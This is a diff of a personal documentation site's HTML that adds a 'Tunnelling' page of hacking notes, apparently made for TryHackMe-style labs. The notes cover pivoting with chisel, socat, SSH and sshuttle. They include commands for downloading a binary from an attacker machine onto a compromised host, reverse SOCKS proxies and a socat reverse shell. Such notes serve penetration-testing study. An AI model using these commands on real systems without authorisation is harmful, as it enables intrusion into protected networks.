@@ -9,7 +9,7 @@
 
     <link rel="icon" href="/images/favicon.png" type="image/png">
 
-    <title>Servers - Docs</title>
+    <title>Tunnelling - Docs</title>
 
     
     <link href="/css/nucleus.css?1677544343" rel="stylesheet">
@@ -35,7 +35,7 @@
     </style>
     
   </head>
-  <body class="" data-url="/servers/">
+  <body class="" data-url="/hacking/notes/tunnelling/">
     <nav id="sidebar" class="">
 
 
@@ -105,7 +105,7 @@
     
     <li data-nav-id="/servers/" title="Servers" class="dd-item
         
-        active
+        
         
         ">
       <a href="/servers/">
@@ -128,7 +128,7 @@
   
     
     <li data-nav-id="/hacking/" title="Hacking" class="dd-item
-        
+        parent
         
         
         ">
@@ -157,7 +157,7 @@
   
     
     <li data-nav-id="/hacking/notes/" title="Notes" class="dd-item
-        
+        parent
         
         
         ">
@@ -225,7 +225,7 @@
  
   
     
-      <li data-nav-id="/hacking/notes/tunnelling/" title="Tunnelling" class="dd-item ">
+      <li data-nav-id="/hacking/notes/tunnelling/" title="Tunnelling" class="dd-item active">
         <a href="/hacking/notes/tunnelling/">
         Tunnelling
         
@@ -382,7 +382,7 @@
                   
                   
                   <div id="top-github-link">
-                    <a class="github-link" title='Edit this page' href="sasquatchmitch.blogServers/_index.en.md" target="blank">
+                    <a class="github-link" title='Edit this page' href="sasquatchmitch.blogHacking/Notes/tunnelling.md" target="blank">
                       <i class="fas fa-code-branch"></i>
                       <span id="top-github-link-text">Edit this page</span>
                     </a>
@@ -397,6 +397,8 @@
                         </a>
                     </span>
                   
+                  <span id="toc-menu"><i class="fas fa-list-alt"></i></span>
+                  
                   <span class="links">
                  
                  
@@ -407,7 +409,19 @@
             
           
           
-            <a href='/'>About</a> > Servers
+            
+            
+          
+          
+            
+            
+          
+          
+            <a href='/'>About</a> > <a href='/hacking/'>Hacking</a> > <a href='/hacking/notes/'>Notes</a> > Tunnelling
+          
+        
+          
+        
           
         
           
@@ -416,6 +430,20 @@
                   </span>
                 </div>
                 
+                    <div class="progress">
+    <div class="wrapper">
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#chisel">Chisel</a></li>
+    <li><a href="#socat">Socat</a></li>
+    <li><a href="#ssh">SSH</a></li>
+    <li><a href="#sshuttle">sshuttle</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+                
               </div>
             </div>
             
@@ -423,28 +451,179 @@
         
         </div>
         
-          <div id="chapter">
-        
         <div id="body-inner">
+          
+            <h1>
+              
+              Tunnelling
+            </h1>
           
 
         
 
 
+<h2 id="chisel">Chisel</h2>
+<ul>
+<li>use webserver method to transfer files or use scp
+<ul>
+<li>scp -i Key chisel user@target:/tmp/chisel</li>
+</ul>
+</li>
+<li>has two modes server and client</li>
+</ul>
+<p><strong>reverse SOCKS proxy</strong></p>
+<ul>
+<li>set up listener on attaacking box
+<ul>
+<li>./chisel server -p listenPort &ndash;reverse &amp;</li>
+</ul>
+</li>
+<li>on the compromised host
+<ul>
+<li>./chisel client attackingIP:listenPort R:socks &amp;</li>
+</ul>
+</li>
+<li>port for sending data back through the proxy will be different</li>
+</ul>
+<p><strong>forward SOCKS proxy</strong></p>
+<ul>
+<li>on compromised host
+<ul>
+<li>./chisel server -p listenPort &ndash;socks5</li>
+</ul>
+</li>
+<li>on attacking box
+<ul>
+<li>./chisel client targerIP:listenPort proxyPort:socks</li>
+</ul>
+</li>
+<li>make sure to set the port in the proxychains config and change the start of the line form socks4 to socks5 as chisel uses socks5</li>
+</ul>
+<p><strong>remote port forward</strong></p>
+<ul>
+<li>on our attacking machine
+<ul>
+<li>./chisel server -p listenPort &ndash;reverse &amp;</li>
+</ul>
+</li>
+<li>on the compromised host
+<ul>
+<li>./chisel client attackingIP:listenPort R:localPort:targetIP:targetPort &amp;</li>
+<li>listenPort - port for the chisel server</li>
+<li>localPort - port we wish to open on the attacking machine to link with the desired target port</li>
+</ul>
+</li>
+</ul>
+<p><strong>local port forward</strong></p>
+<ul>
+<li>
+<p>on compromised machine</p>
+<ul>
+<li>./chisel server -p listenPort</li>
+</ul>
+</li>
+<li>
+<p>on attacking machine</p>
+<ul>
+<li>./chisel client listenIP:listenPort localPort:targetIP:targetPort</li>
+</ul>
+</li>
+<li>
+<p>to destroy the connections use</p>
+<ul>
+<li>jobs - list background jobs</li>
+<li>kill %number</li>
+</ul>
+</li>
+</ul>
+<h2 id="socat">Socat</h2>
+<p>Upload the Socat binary to the compromised box</p>
+<ul>
+<li>sudo python3 -m http.server 80</li>
+<li>On target: curl attackingIP/socat -o /tmp/socat &amp;&amp; chmod +x /tmp/socat</li>
+<li>set up netcat on attacking machine</li>
+<li>Start a relay from compromised server to attacking machine: ./socat tcp-l:listeningPort tcp:attackingIP:Port &amp;
+<ul>
+<li>&amp; to background the socat process</li>
+</ul>
+</li>
+</ul>
+<p><strong>Port Forwarding</strong></p>
+<ul>
+<li>./socat tcp-l:listeningport,fork,reuseaddr tcp:targetIP:Port &amp;
+<ul>
+<li>fork - put every connection into a new process</li>
+<li>reuseaddr - the port stays open after a connection is made to it</li>
+</ul>
+</li>
+</ul>
+<p><strong>Stable Linux Reverse Shell</strong></p>
+<ul>
+<li>on listening machine:
+<ul>
+<li>socat TCP-L:<!-- raw HTML omitted --> FILE:<code>tty</code>,raw,echo=0</li>
+<li>on connecting machine:
+<ul>
+<li>socat TCP:<!-- raw HTML omitted -->:<!-- raw HTML omitted --> EXEC:&ldquo;bash -li&rdquo;,pty,stderr,sigint,setsid,sane</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="ssh">SSH</h2>
+<p><strong>Forward Connections</strong></p>
+<ul>
+<li><strong>Port Forwarding</strong>
+<ul>
+<li>ssh -L LocalPort:TargetIP user@AccessedMachineIP -fN</li>
+<li>-f(backgrounds the shell)N(no need to execute any commands)</li>
+<li>access target machine through accessed machine</li>
+</ul>
+</li>
+<li><strong>Proxies</strong>
+<ul>
+<li>ssh -D LocalPort user@TargetIP -fN</li>
+<li>useful when combined with proxychains</li>
+<li>opens port on attacking machine and sends traffic through into the protected network</li>
+</ul>
+</li>
+<li><strong>Reverse Connections</strong>
+<ul>
+<li>Create ssh keys and make sure the key can only be used for port forwarding.</li>
+<li>ssh -R LocalPort:TargetIP:TargetPort Username@AttackingIP -i Keyfile -fN</li>
+</ul>
+</li>
+</ul>
+<h2 id="sshuttle">sshuttle</h2>
+<ul>
+<li>installed with sudo apt install sshuttle on attacking machine</li>
+<li>to connect with a server
+<ul>
+<li>sshuttle -r username@address subnet</li>
+<li>ex: sshuttle -r <a href="mailto:user@172.16.0.5">user@172.16.0.5</a> 172.16.0.0/24</li>
+<li>can use -N to try and automatically determine the subnet</li>
+<li>can also use &amp; to background the commands</li>
+</ul>
+</li>
+<li>when you dont have the password or it requires key-based auth
+<ul>
+<li>&ndash;ssh-cmd</li>
+<li>ex: sshuttle -r user@address &ndash;ssh-cmd &ldquo;ssh -i KEYFILE&rdquo; subnet</li>
+</ul>
+</li>
+<li>when the compromised server is in the same subnet you are trying to forward to use:
+<ul>
+<li>-x - tells sshuttle toi exclude the compromised server from the subnet range</li>
+<li>ex: sshuttle -r user@address subnet -x excludedIP</li>
+</ul>
+</li>
+</ul>
 
-	<h1 id="servers">Servers</h1>
-<p>Discover what this Hugo theme is all about and the core-concepts behind it.</p>
 
-
-
-
-
-<footer class=" footline" >
+<footer class="footline">
 	
 </footer>
 
-        
-            </div> 
         
         </div>
         
@@ -495,7 +674,6 @@
             
                 
                     
-                    
                 
                 
 
@@ -512,8 +690,6 @@
             
                 
                     
-                        
-                        
                     
                 
                 
@@ -530,6 +706,7 @@
             
                 
                     
+                    
                 
                 
 
@@ -543,21 +720,8 @@
             
                 
                     
-                
-                
-
-                    
-                    
-                    
-
-                    
-            
-        
-                    
                         
-            
-            
-                
+                        
                     
                 
                 
@@ -586,6 +750,23 @@
             
         
                     
+                        
+            
+            
+                
+                    
+                    
+                
+                
+
+                    
+                    
+                    
+
+                    
+            
+        
+                    
             
         
                     
@@ -593,6 +774,9 @@
             
             
                 
+                    
+                        
+                        
                     
                 
                 
@@ -649,10 +833,10 @@
 	 
 	 
 		
-			<a class="nav nav-prev" href="/networking/" title="Networking"> <i class="fa fa-chevron-left"></i></a>
+			<a class="nav nav-prev" href="/hacking/notes/shells/" title="Shells"> <i class="fa fa-chevron-left"></i></a>
 		
 		
-			<a class="nav nav-next" href="/hacking/" title="Hacking" style="margin-right: 0px;"><i class="fa fa-chevron-right"></i></a>
+			<a class="nav nav-next" href="/hacking/tryhackme/" title="TryHackMe" style="margin-right: 0px;"><i class="fa fa-chevron-right"></i></a>
 		
 	
     </div>
@@ -684,3 +868,4 @@
 
   </body>
 </html>
+
